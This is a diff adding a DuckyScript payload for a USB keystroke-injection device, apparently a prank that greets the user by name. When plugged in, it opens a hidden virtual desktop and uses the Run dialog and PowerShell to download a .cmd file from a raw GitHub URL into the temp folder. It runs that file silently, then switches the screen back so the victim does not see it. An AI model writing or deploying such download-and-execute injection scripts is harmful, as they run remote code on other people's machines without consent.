@@ -1,0 +1,41 @@
+REM Olá user script
+REM Criando um novo desktop
+DELAY 220
+GUI CTRL D
+GUI CTRL D
+GUI CTRL D
+GUI CTRL D
+GUI CTRL D
+GUI CTRL D
+GUI CTRL D
+GUI CTRL D
+REM DELAY 2000
+GUI r
+DELAY 250
+REM Usando explorer pra executar o powershell como adm
+STRING powershell.exe -Command "Invoke-WebRequest https://raw.githubusercontent.com/oyuriroferr/pico-ducky/refs/heads/main/Prank/Hi-User/msgbxuser.cmd -OutFile $env:temp\msgbxuser.cmd" 
+ENTER
+DELAY 1000
+GUI r
+DELAY 250
+STRING cmd.exe /Q /C  "%TMP%\msgbxuser.cmd"
+ENTER
+DELAY 520
+GUI CTRL LEFTARROW
+GUI CTRL LEFTARROW
+GUI CTRL LEFTARROW
+GUI CTRL LEFTARROW
+GUI CTRL LEFTARROW
+GUI CTRL LEFTARROW
+GUI CTRL LEFTARROW
+GUI CTRL LEFTARROW
+DELAY 250
+ENTER
+
+REM $text = 'Olá' + ' ' + $env:username; Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show($text,Exclamation)
+REM $msgBody =  'Olá' + ' ' + $env:username
+REM $msgTitle = 'H33Ll00'
+REM $msgButton = 'AbortRetryIgnorel'
+REM $msgImage = 'Exclamation'
+REM $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+REM powershell.exe -Command "Add-Type -AssemblyName PresentationFramework;$msgBody =  'Olá' + ' ' + $env:username;$msgImage = 'Exclamation';$Result = [System.Windows.MessageBox]::Show($msgBody,$'Hh33Ll0o','ok',$msgImage);"
